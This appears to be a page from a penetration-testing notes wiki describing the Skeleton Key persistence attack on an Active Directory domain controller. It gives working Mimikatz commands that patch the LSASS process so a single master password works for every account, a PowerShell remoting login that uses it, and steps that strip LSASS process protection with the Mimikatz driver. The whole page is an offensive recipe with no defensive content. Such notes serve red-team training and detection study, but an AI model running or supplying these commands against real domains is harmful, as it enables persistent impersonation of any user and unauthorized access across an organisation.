---
description: Skeleton Key
---

# Skeleton Key

> Persistance technique where it is possible to patch a DC (LSASS process) so that it allows access as any user with a single password. We are going to inject a skeleton key so that we can access any resource as any user with explicit credentials (mimikatz).

### Injecting Skeleton Key in the DC (need domain admin privs)

1. Patch LSASS:

```bash
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName $DC_NAME
```

1. Enter any machine with a valid user and pw "mimikatz":

```bash
Enter-PSSession -ComputerName $COMPUTER_NAME -Credential $domain\$user
```

**Note 1:** Only computers/users who authenticate to the patched DC are affected.

**Note 2:** Once LSASS has been patched, we can not re-patch it until the system is rebooted.

**Note 3:** Both actual user credentials and skeleton key works.

***

### LSASS running as protected process

If the LSASS is running as protected process we can still use Skeleton Key, but we need Mimikatz drivers on the disk of the DC (mimidriv.sys). That would be very noisy.

```bash
mimikatz# privilege::debug
mimikatz# !+
mimikatz# !processprotect /process:lsass.exe /remove
mimikatz# misc::skeleton
mimikatz# !-
```
